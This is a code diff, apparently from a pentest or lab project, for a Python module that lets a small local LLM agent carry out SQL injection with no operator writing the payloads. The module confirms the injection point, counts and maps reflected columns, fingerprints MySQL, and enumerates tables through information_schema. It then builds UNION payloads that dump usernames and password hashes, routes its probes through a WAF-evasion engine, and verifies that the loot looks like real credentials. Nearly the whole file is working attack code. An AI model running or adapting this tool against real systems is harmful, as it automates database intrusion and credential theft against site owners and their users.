@@ -1,32 +1,36 @@
-"""Descubrimiento de esquema para SQL injection.
+"""Descubrimiento de esquema con VERIFICACIÓN por etapas para SQL injection.
 
 El agente AVERIGUA la estructura de la base de datos enviando consultas y leyendo las respuestas —
-nunca asume la tabla ni las columnas. Es el mismo procedimiento de un pentester (o de sqlmap):
-confirmar la inyección, aprender cuántas columnas hay, enumerar el esquema desde information_schema
-y recién ahí extraer. La mecánica es determinista para que un modelo local pequeño sea fiable; la
-única decisión que queda para el LLM es cuáles de las columnas descubiertas son las credenciales.
+nunca asume la tabla ni las columnas— y, como un pentester real (metodología OWASP WSTG-INPV-05),
+CONFIRMA cada etapa con técnicas independientes en vez de dar un paso por sentado:
 
-Habla con el exterior por un solo callback, `probe(sql) -> ProbeResult`, que envía una inyección
-base y devuelve los valores reflejados. Quien lo usa conecta `probe` al motor de evasión + objetivo,
-así el descubrimiento no depende de DVWA en concreto."""
+  * Inyección confirmada por varias vías: error-based, boolean-based (diferencial 1=1 vs 1=2) y
+    union-based (no una sola señal).
+  * Fingerprint del DBMS (@@version) antes de usar sintaxis específica de MySQL.
+  * Conteo de columnas validado por ORDER BY y cruzado con UNION.
+  * Extracción verificada: se comprueba que lo extraído parezca credenciales (hashes/secretos).
+
+La mecánica es determinista para que un modelo local pequeño sea fiable; la única decisión que
+queda para el LLM es cuáles de las columnas descubiertas son las credenciales. Habla con el
+exterior por un callback `probe(sql) -> ProbeResult`, que quien lo usa conecta al motor de evasión
+y al objetivo, así el descubrimiento no depende de DVWA en concreto."""
 from __future__ import annotations
 
+import re
 from dataclasses import dataclass, field
 from typing import Callable, Optional
 
 _USER_HINTS = ("user", "login", "uname", "name", "email", "mail", "account")
 _PASS_HINTS = ("pass", "pwd", "secret", "hash", "token", "credential")
 _MAX_COLUMNS = 12
+_HASH_RE = re.compile(r"^[0-9a-f]{16,}$", re.IGNORECASE)
 
 
 @dataclass
 class ProbeResult:
-    """Resultado de enviar una inyección base. `cells` son las filas con los valores que se ven en
-    las columnas REFLEJADAS, en orden (cells[f][0] = valor de la primera posición reflejada)."""
-
     cells: list[list[str]] = field(default_factory=list)
     db_error: bool = False
-    blocked: bool = False  # el WAF no se pudo evadir para esta prueba
+    blocked: bool = False
 
 
 @dataclass
@@ -35,10 +39,13 @@ class DiscoveryResult:
     quote: str = ""
     columns: int = 0
     reflected: list[int] = field(default_factory=list)
+    techniques: list[str] = field(default_factory=list)  # técnicas que confirmaron la inyección
+    dbms: str = ""                                        # @@version detectado
     tables: list[str] = field(default_factory=list)
     target_table: str = ""
     cred_columns: tuple[str, str] = ("", "")
     extracted: list[dict[str, str]] = field(default_factory=list)
+    verified: bool = False                               # la extracción parece credenciales reales
     final_payload: str = ""
     trace: list[str] = field(default_factory=list)
 
@@ -48,13 +55,10 @@ Picker = Callable[[str, list[str]], Optional[tuple[str, str]]]
 
 
 def _hexlit(s: str) -> str:
-    """Literal hexadecimal de MySQL, p. ej. 'users' -> 0x7573657273 (evita tener que usar comillas)."""
     return "0x" + s.encode("utf-8").hex()
 
 
 def _best_match(columns: list[str], hints: tuple[str, ...]) -> str:
-    """Prefiere una coincidencia exacta (p. ej. `user`), luego una subcadena que no sea columna id
-    (así `user` gana a `user_id`)."""
     for c in columns:
         if c.lower() in hints:
             return c
@@ -66,7 +70,6 @@ def _best_match(columns: list[str], hints: tuple[str, ...]) -> str:
 
 
 def pick_credential_columns(table: str, columns: list[str]) -> Optional[tuple[str, str]]:
-    """Respaldo determinista para la única decisión: cuáles son usuario y contraseña."""
     user_col = _best_match(columns, _USER_HINTS)
     pass_col = _best_match(columns, _PASS_HINTS)
     if user_col and pass_col and user_col != pass_col:
@@ -81,77 +84,112 @@ class SchemaDiscovery:
         self.say = say or (lambda _m: None)
         self.pick = pick
 
-    def discover(self) -> DiscoveryResult:
-        """Averigua comillas, nº de columnas, columnas reflejadas, tablas y columnas de credenciales."""
-        res = DiscoveryResult()
+    def _log(self, res: DiscoveryResult, msg: str) -> None:
+        res.trace.append(msg)
+        self.say(f"[Descubrimiento] {msg}")
 
-        # 1+2. Confirmar la inyección y contar columnas, probando contexto de cadena y luego entero.
+    def discover(self) -> DiscoveryResult:
+        res = DiscoveryResult()
+        baseline = self.probe("1")  # respuesta normal (sin inyección), para el test diferencial
+
+        # 1. Confirmar inyección + nº de columnas, probando contexto de cadena y luego entero.
         for quote in ("'", ""):
             first = self.probe(f"1{quote} ORDER BY 1-- -")
             if first.blocked or first.db_error:
-                continue  # en el contexto correcto, ORDER BY 1 debe ser válido
+                continue
             cols = _MAX_COLUMNS
             for n in range(2, _MAX_COLUMNS + 1):
                 r = self.probe(f"1{quote} ORDER BY {n}-- -")
-                if r.blocked:
-                    cols = n - 1
-                    break
-                if r.db_error:
+                if r.blocked or r.db_error:
                     cols = n - 1
                     break
             if cols >= 1:
                 res.injectable, res.quote, res.columns = True, quote, cols
                 break
-        res.trace.append(f"inyectable={res.injectable} comillas={res.quote!r} columnas={res.columns}")
-        self.say(f"[Descubrimiento] inyectable={res.injectable} comillas={res.quote!r} columnas={res.columns}")
+        self._log(res, f"inyectable={res.injectable} comillas={res.quote!r} columnas={res.columns} (ORDER BY)")
         if not res.injectable:
             return res
+        q = res.quote
 
-        # 3. Qué columnas se reflejan en la página (con marcadores numéricos únicos).
+        # 2. VERIFICAR la inyección con técnicas independientes (OWASP WSTG-INPV-05).
+        self._confirm_injection(res, q, baseline)
+
+        # 3. Qué columnas se reflejan (y de paso valida el nº de columnas por UNION).
         sentinels = [str(1000 + i) for i in range(res.columns)]
-        r = self.probe(f"-1{res.quote} UNION SELECT {','.join(sentinels)}-- -")
+        r = self.probe(f"-1{q} UNION SELECT {','.join(sentinels)}-- -")
         flat = {c for row in r.cells for c in row}
         res.reflected = [i for i, s in enumerate(sentinels, start=1) if s in flat]
-        res.trace.append(f"columnas reflejadas={res.reflected}")
-        self.say(f"[Descubrimiento] columnas reflejadas={res.reflected}")
-        if not res.reflected:
+        if res.reflected:
+            res.techniques.append("union-based")
+            self._log(res, f"columnas reflejadas={res.reflected} (nº de columnas validado por UNION)")
+        else:
+            self._log(res, "sin columnas reflejadas: no se puede continuar por UNION")
             return res
 
-        # 4. Enumerar las tablas de la base de datos actual.
+        # 4. Fingerprint del DBMS antes de usar sintaxis específica de MySQL.
+        self._fingerprint(res)
+
+        # 5. Enumerar las tablas de la base de datos actual.
         res.tables = self._col0(self._single(res, "table_name",
             " FROM information_schema.tables WHERE table_schema=database()"))
-        res.trace.append(f"tablas={res.tables}")
-        self.say(f"[Descubrimiento] tablas={res.tables}")
+        self._log(res, f"tablas={res.tables}")
 
-        # 5. Por cada tabla, leer sus columnas y decidir si tiene credenciales.
+        # 6. Por cada tabla, leer sus columnas y decidir si tiene credenciales.
         for table in res.tables or [""]:
             cols = self._col0(self._single(res, "column_name",
                 f" FROM information_schema.columns WHERE table_name={_hexlit(table)}")) if table else []
             picked = self.pick(table, cols)
-            res.trace.append(f"columnas de {table!r}={cols} -> credenciales={picked}")
-            self.say(f"[Descubrimiento] columnas de {table!r}={cols} -> credenciales={picked}")
+            self._log(res, f"columnas de {table!r}={cols} -> credenciales={picked}")
             if picked:
                 res.target_table, res.cred_columns = table, picked
                 break
         return res
 
+    def _confirm_injection(self, res: DiscoveryResult, q: str, baseline: ProbeResult) -> None:
+        """Confirma la inyección por vías independientes y registra la evidencia."""
+        if self.probe(f"1{q}").db_error:
+            res.techniques.append("error-based")
+        true_r = self.probe(f"1{q} AND 1=1-- -")
+        false_r = self.probe(f"1{q} AND 1=2-- -")
+        if true_r.cells and not false_r.cells:
+            res.techniques.append("boolean-based")
+        confirmed = res.techniques or ["order-by"]
+        self._log(res, f"inyección confirmada por: {confirmed}")
+
+    def _fingerprint(self, res: DiscoveryResult) -> None:
+        """Detecta el motor de base de datos con @@version."""
+        ver = self._col0(self._single(res, "@@version"))
+        res.dbms = ver[0] if ver else ""
+        low = res.dbms.lower()
+        kind = ("MariaDB" if "maria" in low else "MySQL" if ("mysql" in low or low[:1].isdigit())
+                else (res.dbms or "desconocido"))
+        self._log(res, f"DBMS={kind} (version={res.dbms!r})")
+
     def build_dump_payload(self, res: DiscoveryResult) -> str:
-        """Construye (de forma determinista) el payload de extracción desde el esquema descubierto."""
         user_col, pass_col = res.cred_columns
         return self._pair(res, user_col, pass_col, f" FROM {res.target_table}")
 
     def extract(self, payload: str, res: DiscoveryResult) -> list[dict[str, str]]:
-        """Envía el payload de extracción y devuelve las filas (usuario, hash)."""
         r = self.probe(payload)
         rows = [{"username": row[0], "hash": row[1]} for row in r.cells if len(row) >= 2]
         res.final_payload = payload
         res.extracted = rows
-        res.trace.append(f"extraidas {len(rows)} filas con {payload!r}")
-        self.say(f"[Descubrimiento] extraidas {len(rows)} filas")
+        self._verify_extraction(res)
         return rows
 
+    def _verify_extraction(self, res: DiscoveryResult) -> None:
+        """Comprueba que lo extraído parezca credenciales (hash o secreto no trivial)."""
+        rows = res.extracted
+        plausible = [
+            r for r in rows
+            if r.get("hash") and r["hash"] != r.get("username")
+            and (_HASH_RE.match(r["hash"]) or len(r["hash"]) >= 4)
+        ]
+        res.verified = bool(rows) and len(plausible) >= max(1, len(rows) // 2)
+        self._log(res, f"extracción verificada={res.verified} "
+                       f"({len(plausible)}/{len(rows)} con credenciales plausibles)")
+
     def run(self) -> DiscoveryResult:
-        """Descubre y extrae en una pasada (útil para pruebas y uso directo)."""
         res = self.discover()
         if res.cred_columns[0]:
             self.extract(self.build_dump_payload(res), res)
@@ -160,7 +198,7 @@ class SchemaDiscovery:
     # --- constructores de payload: ponen la(s) expresión(es) en la(s) posición(es) reflejada(s) ---
 
     def _single(self, res: DiscoveryResult, expr: str, from_clause: str = "") -> str:
-        pos = res.reflected[0]
+        pos = res.reflected[0] if res.reflected else 1
         slots = [expr if i == pos else str(i) for i in range(1, res.columns + 1)]
         return f"-1{res.quote} UNION SELECT {','.join(slots)}{from_clause}-- -"
 
